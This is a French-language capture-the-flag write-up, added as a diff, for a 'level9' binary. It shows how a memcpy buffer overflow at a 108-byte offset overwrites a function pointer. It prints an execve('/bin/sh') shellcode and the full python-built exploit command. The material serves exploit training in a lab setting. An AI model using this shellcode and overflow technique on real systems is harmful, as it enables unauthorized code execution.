@@ -1,0 +1,39 @@
+En lancant le programme, il se passe pas grand chose avec ou sans arguments sauf quand il y'a un grand nombre de caractere, ce qui fait segfault le programme.
+
+On decide donc de trouver si le programme touche des registres avec un pattern.
+En faisant ceci, on peut voir un offset de 108 sur le registre eax.
+En utilisant gdb et en regardant regulierement les registres, on peut voir que l'argument que l'on donne est enregistre dans eax et que celui ci est ensuite donne a ebx qui sera call un peut plus tard dans le code. Le call fait appel a un pointeur sur fonction.
+
+
+A partir de la, on peut definir 4 choses:
+- eax contient argv[1]
+- On a un offset de 108 sur eax overwritable au moment du memcpy
+- ebx deviendra eax apres le memcpy
+- *ebx sera call a la fin du code.
+
+On peut donc essayer de faire un shellcode qui sera contenu dans argv[1] et qu'on appellera grace a ebx qui est lui meme modifiable en faisant un buffer overflow sur memcpy
+
+Mais pour pouvoir call le shellcode on doit donc trouver l'adresse de eax quand il vaut encore argv[1].
+```asm
+(gdb) i r
+eax            0x804a00c        134520844
+...
+
+(gdb) x/s $eax
+0x804a00c:       'A' <repeats 194 times>
+```
+
+eax est donc a la position: `0x804a00c`.
+Le shellcode que l'on va utiliser est le meme que celui du level2: `\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80` avec une taille de 21 octets.
+Lors du call *$ebx, le code fait appel a un pointeur sur fonction, on doit donc le faire en 2 temps: `edx -> *function -> dereferenced function`
+edx doit pointer sur le pointeur de la fonction, dans notre cas, edx doit pointer vers l'adresse du shellcode.
+
+On aura donc: `./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + '\x90' * 83 + '\x0c\xa0\x04\x08')")`
+
+L'adresse `0x0804a010` est l'adresse du shellcode, elle se situe a 4 octets apres l'adresse `0x0804a00c`.
+L'adresse `0x0804a00c` est la ou l'on redirige ebx qui est aussi l'adresse de argv[1].
+On fait 83 octets de NOP pour pouvoir overwrite eax qui se situe a 108 octets de argv[1].
+
+adresse du shellcode - shellcode - offset    - adresse du pointeur vers le shellcode
+4 octets             - 21 octets - 108-25=83 - 4octets
+
